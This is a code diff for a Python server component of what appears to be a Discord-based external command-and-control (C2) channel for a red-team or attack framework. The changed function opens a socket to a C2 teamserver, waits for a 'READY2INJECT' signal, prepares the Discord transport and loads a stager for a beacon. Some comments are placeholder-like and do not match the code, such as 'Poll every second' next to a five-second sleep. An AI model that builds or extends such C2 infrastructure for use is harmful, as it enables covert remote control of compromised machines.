@@ -2,10 +2,13 @@ import discord
 import asyncio
 import argparse
 import os
+import sys
 from utils import commonUtils
 from utils.encoders import encoder_base64
+from utils.transports import transport_discord
 from time import sleep
 import establishedSession
+import configureStage
 import config
 from threading import Thread
 
@@ -35,14 +38,37 @@ def importModule(modName, modType):
 
 def createConnection(beaconId):
     """
-    Function responsible for configuring the initial stager for an incoming connection.
+    Function responsible for configuring the initial stager
+    for an incoming connection. Will return the socket connection
+    responsible for issuing tasks.
+
     Returns:
-        discord client connection for issuing tasks.
+        socket connection to the Teamserver
     """
-    # In Discord C2, the connection is through a Discord channel/message interaction
-    if config.verbose:
-        print(f"Establishing connection for beacon {beaconId}")
-    return beaconId  # For Discord, the connection is tied to the beacon ID
+    # Start with logic to setup the connection to the external_c2 server
+    sock = commonUtils.createSocket()
+
+    while True:
+        # Replace this with the actual implementation to check for messages from the client
+        message = commonUtils.recvFrameFromC2(sock)  # Example method to receive messages
+        if message == "READY2INJECT":
+            if config.verbose:
+                print(commonUtils.color("Client ready to receive stager"))
+            break  # Exit the loop once the client confirms readiness
+        sleep(5)  # Poll every second, adjust as necessary
+
+    # Prep the transport module
+    prep_trans = transport_discord.prepTransport()
+
+    # Let's get the stager from the C2 server
+    stager_status = configureStage.loadStager(sock, beaconId)
+
+    if stager_status != 0:
+        # Something went horribly wrong
+        print(commonUtils.color("Something went terribly wrong while configuring the stager!", status=False, warning=True))
+        sys.exit(1)
+
+    return sock
 
 
 async def sendTask(channel, task, beaconId):
